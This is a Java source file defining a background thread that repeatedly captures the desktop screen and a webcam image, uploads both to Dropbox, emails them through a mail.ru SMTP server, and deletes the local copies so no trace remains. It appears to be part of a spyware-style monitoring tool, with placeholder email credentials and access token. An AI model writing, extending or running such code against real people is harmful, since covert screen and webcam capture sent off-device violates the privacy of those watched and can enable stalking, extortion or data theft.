package com.company.screenshot.thread;

import com.company.screenshot.cloud_loader.DropboxUploader;
import com.company.screenshot.email_sender.EmailSender;
import com.company.screenshot.file_manager.FileManager;
import com.company.screenshot.name_generator.ScreenshotNameGenerator;
import com.company.screenshot.screenshot_maker.ScreenshotMaker;
import com.company.screenshot.snapshot_webcam_maker.SnapshotWebcamMaker;

import java.awt.image.BufferedImage;

public class ScreenshotThread extends Thread{
    private int sendingDelayInSeconds;
    private int sendingDelayInMilliseconds;

    public ScreenshotThread(int sendingDelayInSeconds) {
        this.sendingDelayInSeconds = sendingDelayInSeconds;
        final int AMOUNT_MILLISECONDS_IN_SECOND = 1000;
        sendingDelayInMilliseconds = sendingDelayInSeconds * AMOUNT_MILLISECONDS_IN_SECOND;
    }

    @Override
    public void run() {
        while(true){
            try {
                ScreenshotNameGenerator screenshotNameGenerator = new ScreenshotNameGenerator().setDatePattern("YYYYMMdd_HHmmss")
                                                                                               .setExtension("png");

                FileManager fileManager = new FileManager();

                EmailSender emailSender = new EmailSender();
                emailSender.setHost("smtp.mail.ru");
                emailSender.setFrom("Enter your email");
                emailSender.setTo("Enter email receiver");
                emailSender.setUsername("Enter your email");
                emailSender.setPassword("Enter password your email");

                String accessToken = "Enter your token";
                DropboxUploader dropboxUploader = new DropboxUploader(accessToken);

                ScreenshotMaker screenshotMaker = new ScreenshotMaker();
                BufferedImage screenshotFromScreen = screenshotMaker.makeScreenshotFromScreen();
                screenshotNameGenerator.setScreenshotName("desktop");
                dropboxUploader.uploadScreenshot(screenshotFromScreen, screenshotNameGenerator);
                String pathToScreenshotFromDesktop = fileManager.saveScreenshotFromScreenInDirectory(fileManager.getHomeDirectory(),
                                                                                                     screenshotMaker, screenshotNameGenerator);
                emailSender.sendScreenshot(pathToScreenshotFromDesktop);
                fileManager.deleteFile(pathToScreenshotFromDesktop);

                SnapshotWebcamMaker snapshotWebcamMaker = new SnapshotWebcamMaker();
                BufferedImage snapshotFromWebcam = snapshotWebcamMaker.makeSnapshotFromWebCam();
                screenshotNameGenerator.setScreenshotName("webcam");
                dropboxUploader.uploadScreenshot(snapshotFromWebcam, screenshotNameGenerator);
                String pathToImageFromWebcam = fileManager.saveSnapshotFromWebcamInDirectory(fileManager.getHomeDirectory(),
                                                                                                 snapshotWebcamMaker, screenshotNameGenerator);
                emailSender.sendScreenshot(pathToImageFromWebcam);
                fileManager.deleteFile(pathToImageFromWebcam);

                sleep(sendingDelayInMilliseconds);

            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }
}
